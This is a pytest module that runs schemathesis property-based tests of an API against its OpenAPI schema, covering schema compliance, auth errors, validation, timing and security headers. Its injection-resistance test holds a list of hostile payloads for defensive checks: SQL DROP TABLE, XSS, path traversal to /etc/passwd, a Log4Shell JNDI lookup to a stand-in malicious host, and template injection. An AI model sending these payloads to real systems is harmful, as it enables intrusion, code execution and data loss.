"""
Schemathesis Property-Based API Testing Integration

This module contains comprehensive property-based tests using schemathesis
for testing the Claude-Optimized Deployment Engine API against its OpenAPI schema.
"""

import pytest
import schemathesis
from typing import Dict, Any, List
from httpx import AsyncClient
from hypothesis import settings, HealthCheck

# Test markers
pytestmark = [pytest.mark.api_contract, pytest.mark.schemathesis, pytest.mark.slow]

# Configure schemathesis settings
schemathesis.fixups.install()

# Test configuration
MAX_EXAMPLES = 50
HYPOTHESIS_DEADLINE = 5000  # 5 seconds per test


class TestSchemathesisBasic:
    """Basic schemathesis property-based tests."""

    @pytest.fixture(scope="class")
    def schema_url(self, sync_client):
        """Get the OpenAPI schema URL."""
        try:
            response = sync_client.get("/docs/openapi.json")
            if response.status_code == 200:
                return "http://testserver/docs/openapi.json"
            else:
                pytest.skip("OpenAPI schema not available")
        except Exception:
            pytest.skip("Cannot access OpenAPI schema")

    @pytest.fixture(scope="class")
    def api_schema(self, schema_url):
        """Load the API schema for schemathesis."""
        try:
            schema = schemathesis.from_uri(schema_url)
            return schema
        except Exception as e:
            pytest.skip(f"Cannot load schema: {e}")

    @settings(
        max_examples=MAX_EXAMPLES,
        deadline=HYPOTHESIS_DEADLINE,
        suppress_health_check=[HealthCheck.too_slow]
    )
    def test_api_schema_compliance(self, api_schema):
        """Test API compliance with OpenAPI schema using property-based testing."""
        
        @api_schema.parametrize()
        @settings(max_examples=10)  # Reduced for basic test
        def run_test(case):
            # Execute the generated test case
            case.call_and_validate()
        
        # Run the parametrized test
        run_test()

    @settings(max_examples=20, deadline=HYPOTHESIS_DEADLINE)
    def test_public_endpoints_schema_compliance(self, api_schema):
        """Test public endpoints with property-based testing."""
        
        # Filter for public endpoints that don't require authentication
        public_paths = ["/", "/health", "/api/public"]
        
        @api_schema.parametrize(endpoint=lambda endpoint: endpoint.path in public_paths)
        @settings(max_examples=5)
        def run_public_test(case):
            # Skip authentication headers for public endpoints
            if "authorization" in case.headers:
                del case.headers["authorization"]
            
            response = case.call()
            
            # Public endpoints should not return 401/403
            if response.status_code in [401, 403]:
                pytest.skip("Endpoint requires authentication")
            
            # Validate response against schema
            case.validate_response(response)
        
        run_public_test()


class TestSchemathesisEndpointSpecific:
    """Endpoint-specific schemathesis tests."""

    @pytest.fixture
    def health_schema(self, sync_client):
        """Get schema for health endpoint specifically."""
        try:
            response = sync_client.get("/docs/openapi.json")
            if response.status_code == 200:
                full_schema = response.json()
                
                # Extract health endpoint schema
                if "/health" in full_schema.get("paths", {}):
                    health_schema = {
                        "openapi": full_schema["openapi"],
                        "info": full_schema["info"],
                        "paths": {"/health": full_schema["paths"]["/health"]},
                        "components": full_schema.get("components", {})
                    }
                    return schemathesis.from_dict(health_schema)
            
            pytest.skip("Health endpoint schema not available")
        except Exception as e:
            pytest.skip(f"Cannot create health schema: {e}")

    @settings(max_examples=15, deadline=HYPOTHESIS_DEADLINE)
    def test_health_endpoint_property_based(self, health_schema):
        """Property-based test for health endpoint."""
        
        @health_schema.parametrize()
        @settings(max_examples=5)
        def run_health_test(case):
            response = case.call()
            
            # Health endpoint should always return 200 or 503
            assert response.status_code in [200, 503]
            
            # Validate response structure
            if response.status_code == 200:
                data = response.json()
                assert "status" in data
                assert "timestamp" in data
                
                # Status should be valid enum value
                assert data["status"] in ["healthy", "unhealthy", "degraded"]
            
            case.validate_response(response)
        
        run_health_test()

    @pytest.fixture
    def circuit_breaker_schema(self, sync_client):
        """Get schema for circuit breaker endpoints."""
        try:
            response = sync_client.get("/docs/openapi.json")
            if response.status_code == 200:
                full_schema = response.json()
                
                # Extract circuit breaker paths
                cb_paths = {
                    path: spec for path, spec in full_schema.get("paths", {}).items()
                    if path.startswith("/api/circuit-breakers")
                }
                
                if cb_paths:
                    cb_schema = {
                        "openapi": full_schema["openapi"],
                        "info": full_schema["info"],
                        "paths": cb_paths,
                        "components": full_schema.get("components", {})
                    }
                    return schemathesis.from_dict(cb_schema)
            
            pytest.skip("Circuit breaker schema not available")
        except Exception as e:
            pytest.skip(f"Cannot create circuit breaker schema: {e}")

    @settings(max_examples=20, deadline=HYPOTHESIS_DEADLINE)
    def test_circuit_breaker_endpoints_property_based(self, circuit_breaker_schema):
        """Property-based test for circuit breaker endpoints."""
        
        @circuit_breaker_schema.parametrize()
        @settings(max_examples=3)
        def run_cb_test(case):
            response = case.call()
            
            # Circuit breaker endpoints should be accessible without auth
            assert response.status_code != 500  # No server errors
            
            if response.status_code == 200:
                data = response.json()
                
                # Should have timestamp in response
                assert "timestamp" in data
                
                # Validate timestamp format
                timestamp = data["timestamp"]
                from datetime import datetime
                datetime.fromisoformat(timestamp.replace("Z", "+00:00"))
            
            case.validate_response(response)
        
        run_cb_test()


class TestSchemathesisErrorScenarios:
    """Test error scenarios with property-based testing."""

    @pytest.fixture
    def auth_schema(self, sync_client):
        """Get schema for authentication endpoints."""
        try:
            response = sync_client.get("/docs/openapi.json")
            if response.status_code == 200:
                full_schema = response.json()
                
                # Extract auth paths
                auth_paths = {
                    path: spec for path, spec in full_schema.get("paths", {}).items()
                    if path.startswith("/auth")
                }
                
                if auth_paths:
                    auth_schema = {
                        "openapi": full_schema["openapi"],
                        "info": full_schema["info"],
                        "paths": auth_paths,
                        "components": full_schema.get("components", {})
                    }
                    return schemathesis.from_dict(auth_schema)
            
            pytest.skip("Auth schema not available")
        except Exception as e:
            pytest.skip(f"Cannot create auth schema: {e}")

    @settings(max_examples=25, deadline=HYPOTHESIS_DEADLINE)
    def test_auth_error_responses_property_based(self, auth_schema):
        """Property-based test for authentication error responses."""
        
        @auth_schema.parametrize()
        @settings(max_examples=5)
        def run_auth_error_test(case):
            # Remove or corrupt authorization headers to test error responses
            if "authorization" in case.headers:
                case.headers["authorization"] = "Bearer invalid-token"
            
            response = case.call()
            
            # Should handle authentication errors gracefully
            assert response.status_code != 500
            
            if response.status_code in [401, 403]:
                # Should have proper error response
                data = response.json()
                assert "detail" in data
                
                # Error message should be string
                assert isinstance(data["detail"], str)
                assert len(data["detail"]) > 0
            
            # Validate against schema (if response matches expected format)
            try:
                case.validate_response(response)
            except Exception:
                # Some generated cases might not match schema exactly
                # This is expected in property-based testing
                pass
        
        run_auth_error_test()

    @settings(max_examples=15, deadline=HYPOTHESIS_DEADLINE)
    def test_validation_error_responses(self, auth_schema):
        """Test validation error responses with property-based testing."""
        
        # Focus on POST endpoints that have request bodies
        @auth_schema.parametrize(method="POST")
        @settings(max_examples=3)
        def run_validation_test(case):
            response = case.call()
            
            if response.status_code == 422:
                # Validation error response
                data = response.json()
                assert "detail" in data
                
                detail = data["detail"]
                if isinstance(detail, list):
                    # Pydantic validation error format
                    for error in detail:
                        assert "loc" in error
                        assert "msg" in error
                        assert "type" in error
                        
                        # Validate field types
                        assert isinstance(error["loc"], list)
                        assert isinstance(error["msg"], str)
                        assert isinstance(error["type"], str)
            
            # Don't validate schema for validation errors as they might not match
            if response.status_code != 422:
                try:
                    case.validate_response(response)
                except Exception:
                    pass
        
        run_validation_test()


class TestSchemathesisDataValidation:
    """Test data validation with property-based testing."""

    @pytest.fixture
    def schema_with_examples(self, sync_client):
        """Get schema and add custom examples for better testing."""
        try:
            response = sync_client.get("/docs/openapi.json")
            if response.status_code == 200:
                schema_dict = response.json()
                
                # Add examples to improve test data generation
                if "components" in schema_dict and "schemas" in schema_dict["components"]:
                    schemas = schema_dict["components"]["schemas"]
                    
                    # Add examples for LoginRequest if it exists
                    if "LoginRequest" in schemas:
                        schemas["LoginRequest"]["example"] = {
                            "username": "testuser",
                            "password": "testpassword123"
                        }
                    
                    # Add examples for other schemas as needed
                    if "CreateUserRequest" in schemas:
                        schemas["CreateUserRequest"]["example"] = {
                            "username": "newuser",
                            "email": "newuser@example.com",
                            "password": "securepassword123"
                        }
                
                return schemathesis.from_dict(schema_dict)
            
            pytest.skip("Schema not available")
        except Exception as e:
            pytest.skip(f"Cannot create enhanced schema: {e}")

    @settings(max_examples=30, deadline=HYPOTHESIS_DEADLINE)
    def test_request_data_validation(self, schema_with_examples):
        """Test request data validation with enhanced examples."""
        
        @schema_with_examples.parametrize(method="POST")
        @settings(max_examples=5)
        def run_data_validation_test(case):
            response = case.call()
            
            # Focus on the validation behavior
            if response.status_code == 422:
                # Expected validation error
                data = response.json()
                assert "detail" in data
            elif response.status_code in [200, 201]:
                # Successful request with valid data
                if response.content:
                    data = response.json()
                    # Response should be valid JSON
                    assert isinstance(data, (dict, list))
            elif response.status_code == 401:
                # Authentication required (expected for many endpoints)
                pass
            
            # Ensure no server errors from malformed data
            assert response.status_code != 500
        
        run_data_validation_test()


class TestSchemathesisPerformance:
    """Test API performance characteristics with property-based testing."""

    @settings(max_examples=10, deadline=10000)  # 10 second deadline for performance tests
    def test_response_time_compliance(self, sync_client):
        """Test response time compliance using property-based testing."""
        try:
            schema = schemathesis.from_uri("http://testserver/docs/openapi.json")
        except Exception:
            pytest.skip("Schema not available for performance testing")
        
        @schema.parametrize()
        @settings(max_examples=2)
        def run_performance_test(case):
            import time
            
            start_time = time.time()
            response = case.call()
            end_time = time.time()
            
            response_time = end_time - start_time
            
            # Response time should be reasonable (under 5 seconds for any endpoint)
            assert response_time < 5.0, f"Response time too slow: {response_time:.2f}s"
            
            # Health checks should be very fast
            if case.endpoint.path == "/health":
                assert response_time < 1.0, f"Health check too slow: {response_time:.2f}s"
            
            # Ensure response is valid regardless of performance
            assert response.status_code != 500
        
        run_performance_test()


class TestSchemathesisSecurityProperties:
    """Test security properties with property-based testing."""

    @settings(max_examples=20, deadline=HYPOTHESIS_DEADLINE)
    def test_security_headers_property_based(self, sync_client):
        """Test security headers using property-based testing."""
        try:
            schema = schemathesis.from_uri("http://testserver/docs/openapi.json")
        except Exception:
            pytest.skip("Schema not available for security testing")
        
        @schema.parametrize()
        @settings(max_examples=3)
        def run_security_test(case):
            response = case.call()
            
            # Check for security headers
            headers = response.headers
            
            # Content-Type should be properly set
            if response.status_code == 200 and response.content:
                assert "content-type" in headers
                content_type = headers["content-type"]
                assert "application/json" in content_type.lower()
            
            # CORS headers should be present if Origin header was sent
            if "origin" in case.headers:
                # Might have CORS headers
                pass
            
            # Should not expose sensitive information in headers
            sensitive_headers = ["x-powered-by", "server"]
            for header in sensitive_headers:
                if header in headers:
                    value = headers[header].lower()
                    # Should not expose detailed server information
                    assert "version" not in value
        
        run_security_test()

    @settings(max_examples=15, deadline=HYPOTHESIS_DEADLINE)
    def test_injection_resistance(self, sync_client):
        """Test injection attack resistance with property-based testing."""
        try:
            schema = schemathesis.from_uri("http://testserver/docs/openapi.json")
        except Exception:
            pytest.skip("Schema not available for injection testing")
        
        # Custom strategy for injection payloads
        from hypothesis import strategies as st
        
        injection_payloads = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://malicious.com/a}",
            "{{7*7}}"
        ]
        
        @schema.parametrize()
        @settings(max_examples=2)
        def run_injection_test(case):
            # Inject malicious payloads into string fields
            if hasattr(case, 'body') and case.body:
                import json
                try:
                    body = json.loads(case.body)
                    if isinstance(body, dict):
                        for key, value in body.items():
                            if isinstance(value, str):
                                # Replace with injection payload
                                import random
                                body[key] = random.choice(injection_payloads)
                        
                        case.body = json.dumps(body)
                except (json.JSONDecodeError, AttributeError):
                    pass
            
            response = case.call()
            
            # Should not cause server errors
            assert response.status_code != 500
            
            # Should not reflect payloads in responses
            if response.content:
                response_text = response.text.lower()
                for payload in injection_payloads:
                    # Basic check - payload shouldn't be reflected
                    if "<script>" in payload:
                        assert "<script>" not in response_text
        
        run_injection_test()


# Utility functions for schemathesis integration
def create_custom_schemathesis_hooks():
    """Create custom hooks for schemathesis testing."""
    
    @schemathesis.hook
    def before_generate_case(context, strategy):
        """Customize test case generation."""
        # Add custom logic for test case generation
        return strategy
    
    @schemathesis.hook  
    def after_call(context, case, response):
        """Custom logic after API call."""
        # Add custom response validation
        pass
    
    @schemathesis.hook
    def before_validate_response(context, response, case):
        """Custom logic before response validation."""
        # Skip validation for certain responses
        if response.status_code == 429:  # Rate limited
            return False  # Skip validation
        return True


# Mark all schemathesis tests as slow
for name in dir():
    if name.startswith('test_') and 'schemathesis' in name.lower():
        obj = locals()[name]
        if hasattr(obj, '__func__'):
            obj.__func__ = pytest.mark.slow(obj.__func__)
        elif callable(obj):
            obj = pytest.mark.slow(obj)